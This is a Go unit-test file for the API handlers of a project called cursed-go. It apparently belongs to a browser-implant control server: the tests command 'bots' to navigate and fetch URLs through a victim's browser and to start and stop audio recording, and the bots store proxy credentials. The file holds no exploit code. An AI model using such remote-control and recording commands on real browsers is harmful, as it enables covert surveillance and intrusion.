package api

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

// fakeRPC records calls and returns a configurable response or error.
type fakeRPC struct {
	mu      sync.Mutex
	calls   []rpcCall
	resp    map[string]any
	err     error
	online  bool
}

type rpcCall struct {
	BrowserID string
	Action    string
	Data      map[string]any
}

func (f *fakeRPC) CallBot(_ context.Context, browserID, action string, data map[string]any) (map[string]any, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.calls = append(f.calls, rpcCall{browserID, action, data})
	return f.resp, f.err
}
func (f *fakeRPC) IsBotOnline(_ uuid.UUID) bool { return f.online }

func setupRemoteAPI(t *testing.T) (*RemoteAPI, *gorm.DB, *fakeRPC) {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	rpc := &fakeRPC{resp: map[string]any{"ok": true}}
	return &RemoteAPI{DB: g, RPC: rpc}, g, rpc
}

func makeBot(t *testing.T, gdb *gorm.DB) models.Bot {
	t.Helper()
	b := models.Bot{
		BrowserID:     "browser-" + uuid.New().String(),
		Name:          "x",
		ProxyUsername: uuid.New().String(),
		ProxyPassword: "p",
		IsOnline:      true,
		LastOnline:    time.Now(),
	}
	if err := gdb.Create(&b).Error; err != nil {
		t.Fatal(err)
	}
	return b
}

func TestRemoteControl_Success(t *testing.T) {
	a, gdb, rpc := setupRemoteAPI(t)
	b := makeBot(t, gdb)

	body, _ := json.Marshal(remoteCtlReq{BotID: b.ID.String(), URL: "https://x"})
	r := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.RemoteControl(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if len(rpc.calls) != 1 {
		t.Fatalf("RPC calls = %d, want 1", len(rpc.calls))
	}
	if rpc.calls[0].Action != "TAB_NAVIGATE_AND_FETCH" {
		t.Errorf("action = %s", rpc.calls[0].Action)
	}
	if rpc.calls[0].Data["url"] != "https://x" {
		t.Errorf("url not forwarded")
	}
}

func TestRemoteControl_BotOffline(t *testing.T) {
	a, gdb, rpc := setupRemoteAPI(t)
	rpc.err = ErrBotOffline
	b := makeBot(t, gdb)

	body, _ := json.Marshal(remoteCtlReq{BotID: b.ID.String(), URL: "https://x"})
	r := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.RemoteControl(rr, r)
	if rr.Code != http.StatusBadGateway {
		t.Errorf("status=%d, want 502", rr.Code)
	}
}

func TestRemoteControl_BotNotFound(t *testing.T) {
	a, _, _ := setupRemoteAPI(t)
	body, _ := json.Marshal(remoteCtlReq{BotID: uuid.New().String(), URL: "x"})
	r := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(body))
	rr := httptest.NewRecorder()
	a.RemoteControl(rr, r)
	if rr.Code != http.StatusNotFound {
		t.Errorf("status=%d", rr.Code)
	}
}

func TestStartStopAudio(t *testing.T) {
	a, gdb, rpc := setupRemoteAPI(t)
	b := makeBot(t, gdb)

	for _, tc := range []struct {
		name   string
		fn     http.HandlerFunc
		action string
	}{
		{"start", a.StartAudio, "START_AUDIO_RECORDING"},
		{"stop", a.StopAudio, "STOP_AUDIO_RECORDING"},
	} {
		body, _ := json.Marshal(audioCtlReq{BotID: b.ID.String()})
		r := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(body))
		rr := httptest.NewRecorder()
		tc.fn(rr, r)
		if rr.Code != http.StatusOK {
			t.Errorf("%s status=%d", tc.name, rr.Code)
		}
	}

	if len(rpc.calls) != 2 {
		t.Fatalf("expected 2 calls, got %d", len(rpc.calls))
	}
}
